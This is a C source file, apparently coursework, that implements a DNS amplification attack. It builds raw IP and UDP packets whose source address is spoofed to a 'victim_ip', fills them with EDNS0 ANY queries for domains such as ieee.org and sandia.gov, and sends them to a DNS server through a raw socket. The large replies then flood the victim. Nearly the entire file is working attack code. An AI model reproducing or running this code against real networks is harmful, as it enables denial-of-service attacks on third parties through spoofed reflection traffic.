#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <time.h>
#define PKT_LEN 8192 // The packet length
#define SA struct sockaddr
#define SA_in struct sockaddr_in
//ref: http://www.tsnien.idv.tw/Internet_WebBook/chap13/13-6%20DNS%20%E8%A8%8A%E6%81%AF%E6%A0%BC%E5%BC%8F.html
//     https://www.binarytides.com/raw-udp-sockets-c-linux/
//     https://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
//     https://github.com/ethanwilloner/DNS-Amplification-Attack?fbclid=IwAR288LqA1OoOGJ0vfqBiFMDtnDHJQ1uX4ywwZy5lVg7R7jqyFBeP3_fQMxY

// def structure
typedef struct iphdr iph; //20 bytes
typedef struct udphdr udph; // 8 bytes
// Pseudoheader structure
typedef struct{
	u_int32_t saddr; // 4 bytes 
	u_int32_t daddr; // 4 bytes
	u_int8_t filler; // 1 byte
	u_int8_t protocol; // 1 byte
	u_int16_t len; // 2 bytes
}pseh;
// DNS header structure 12 bytes
typedef struct{
	unsigned short id; // ID
	unsigned short flag; // DNS Flags 
	// Q/R | OPeration-code | Auth_Ans | TrunCated | Recursive Desired | Recursive Available | Response Code
	unsigned short qcount; // Question Count
	unsigned short ans; // Answer Count
	unsigned short auth; // Authority RR
	unsigned short add;	 // Additional RR
}dns_hdr;
// Question structure 4 bytes in Question sec.
typedef struct{
	unsigned short qtype; // question_type
	unsigned short qclass; //question_class
}query;
// Additional structure 10 bytes in Additional sec.
typedef struct{
	unsigned short type;
	unsigned short udp_payload_size;
	unsigned short rcode_edns0ver;
	unsigned short z;
	unsigned short datalen;
}addition;

unsigned short csum(unsigned short *ptr, int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;
	sum = 0;
	while(nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if(nbytes == 1) {
		oddbyte = 0;
		*((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;
	return answer;
}// copy from https://www.binarytides.com/raw-udp-sockets-c-linux/
void format_query_name(unsigned char *query_name, int select){
	unsigned char dns_record[3][32] = {"ieee.org.", "sandia.gov.", "nctu.edu.tw."};
	int i,j,beg = 0;
	for(i = 0;i < strlen((char *)dns_record[select]);i++)
		if(dns_record[select][i] == '.'){
			*query_name++ = i - beg;
			for(j = beg;j < i;j++)
				*query_name++ = dns_record[select][j];
			beg = i + 1;
		}
	*query_name = 0x00;
}
int dns_send(char *victim_ip, int udp_src_port, char *dns_ip, int dns_port, int select){
	char datagram[PKT_LEN];

	// format DNS header
	dns_hdr *dns = (dns_hdr *)&datagram[sizeof(iph) + sizeof(udph)]; 
	dns->id = htons(0xed35); // DEC 0716085 = HEX AED35
	// flag = 0x100 = 0|000|0|0|1|0|000|0000 -> RD(execute recursive query)
	dns->flag = htons(0x0100);
	dns->qcount = htons(1);// 1 Question sec.
	dns->ans = 0; // no Answer sec.
	dns->auth = 0; // no Authority sec.
	dns->add = htons(1); // 1 Addition sec.

	// format Question sec.
	unsigned char *qname; // question_name
	qname = (unsigned char *)&datagram[sizeof(iph) + sizeof(udph) + sizeof(dns_hdr)]; // padding qname after dns
	format_query_name(qname, select);
	query *q;
	// padding qname after dns,qname, the 1 is because last 0 in qname cant count by strlen
	q = (query *)&datagram[sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen((char *)qname) + 1)];
	q->qtype = htons(0x00ff); // question_type = 0x00ff: type ANY
	q->qclass = htons(0x1); // usually 1, if !1 -> not IP

	// format Additional sec.
	unsigned char *aname = (unsigned char *)&datagram[sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen((char *)qname) + 1) + sizeof(query)];
	*aname = 0x00;
	addition *a = (addition *)&datagram[sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen((char *)qname) + 1) + sizeof(query) + 1];
	a->type = htons(41); // OPT
	a->udp_payload_size = htons(4096);
	a->rcode_edns0ver = htons(0x00);
	a->z = htons(0x00);
	a->datalen = htons(0x00);

	int dns_msg_size = sizeof(dns_hdr) + (strlen((char *)qname) + 1) + sizeof(query) + 1 + sizeof(addition);

	// format the IP & UDP header
	//format IP header
	iph *ip = (iph *)datagram;
	ip->version = 4; // version
	ip->ihl = 5; // header len
	ip->tos = 0; // type of service
	ip->tot_len = sizeof(iph) + sizeof(udph) + dns_msg_size; // total len
	ip->id = htonl(getpid()); //id
	ip->frag_off = 0; // fragment offset
	ip->ttl = 64; // ttl
	ip->protocol = IPPROTO_UDP; // protocol // IPPROTO_UDP = 17
	ip->saddr = inet_addr(victim_ip); // src_ip
	ip->daddr = inet_addr(dns_ip); //dest_ip
	ip->check = 0; // inital checksum = 0
	ip->check = csum((unsigned short *)datagram, ip->tot_len); // calculate ip checksum

	//format UDP header
	udph *udp = (udph *)(datagram + sizeof(iph));
	udp->source = htons(udp_src_port); // src port
	udp->dest = htons(dns_port); // dest port
	udp->len = htons(sizeof(udph) + dns_msg_size); // len
	udp->check = 0; // initial udp checksum
	// format pseudo header for udp checksum
	pseh pse;
	int pse_len = sizeof(udph) + dns_msg_size;
	pse.saddr = inet_addr(victim_ip);
	pse.daddr = inet_addr(dns_ip);
	pse.filler = 0;
	pse.protocol = IPPROTO_UDP;
	pse.len = htons(pse_len);
	char *pse_data = malloc(sizeof(pseh) + pse_len);
	memcpy(pse_data, (char *)&pse, sizeof(pseh));
	memcpy(pse_data + sizeof(pseh), udp,pse_len);
	udp->check = csum((unsigned short *)pse_data, sizeof(pseh) + pse_len); // calculate udp checksum

	// create socket & send
	SA_in sin; // sockaddr_in
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dns_port);
	sin.sin_addr.s_addr = inet_addr(dns_ip);
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW),one = 1; // socket file descriptor
	const int *val = &one;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1){
		printf("[*] Get error in setsockopt\n");
		return -1;
	}
	if(sockfd == -1){
		printf("[x] Could not create socket.\n");
		return -1;
	}
	else
		sendto(sockfd, datagram, ip->tot_len, 0, (SA *)&sin, sizeof(sin));

	close(sockfd);
	free(pse_data);

	return 0;
}
